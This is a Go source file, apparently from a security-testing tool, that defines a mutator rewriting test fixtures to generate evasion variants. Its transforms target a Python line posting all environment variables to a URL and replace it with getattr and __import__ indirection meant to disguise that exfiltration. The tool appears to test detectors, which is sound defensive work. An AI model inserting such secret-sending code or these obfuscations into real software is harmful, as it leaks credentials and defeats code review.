package mutation

import (
	"context"
	"fmt"
	"strings"
	"time"

	"github.com/rantanplan-ai/rantanplan/internal/model"
)

type CodeAliasMutator struct{}

func NewCodeAliasMutator() *CodeAliasMutator {
	return &CodeAliasMutator{}
}

func (m *CodeAliasMutator) Name() string             { return "code-alias-indirection" }
func (m *CodeAliasMutator) Type() model.MutationType { return model.MutationCodeAlias }

func (m *CodeAliasMutator) Mutate(ctx context.Context, fixture model.Fixture, seed int64) ([]model.Variant, error) {
	var variants []model.Variant

	transforms := []struct {
		target      string
		replacement string
		description string
	}{
		{
			target: `requests.post(url, json=os.environ)`,
			replacement: `payload = dict(os.environ)
sender = getattr(requests, 'post')
sender(url, json=payload)`,
			description: "Aliased requests.post using getattr dynamic dispatch and variable assignment",
		},
		{
			target:      `os.environ`,
			replacement: `getattr(__import__('os'), 'environ')`,
			description: "Dynamic module import indirection for os.environ",
		},
	}

	for i, t := range transforms {
		newFiles := make([]model.FixtureFile, len(fixture.Files))
		changed := false

		for fIdx, f := range fixture.Files {
			if strings.Contains(f.Content, t.target) {
				newFiles[fIdx] = model.FixtureFile{
					Path:    f.Path,
					Content: strings.ReplaceAll(f.Content, t.target, t.replacement),
				}
				changed = true
			} else {
				newFiles[fIdx] = f
			}
		}

		if changed {
			varID := fmt.Sprintf("%s-codealias-%d", fixture.ID, i)
			mutatedFixture := fixture
			mutatedFixture.ID = varID
			mutatedFixture.Files = newFiles

			v := model.Variant{
				Fixture:  mutatedFixture,
				ParentID: fixture.ID,
				MutationChain: []model.Mutation{
					{
						ID:                  fmt.Sprintf("mut-codealias-%d", i),
						Type:                model.MutationCodeAlias,
						Description:         t.description,
						PreservedProperties: fixture.GroundTruth.SemanticInvariants,
						Timestamp:           time.Now(),
					},
				},
				Seed:  seed,
				Depth: 1,
			}
			variants = append(variants, v)
		}
	}

	return variants, nil
}
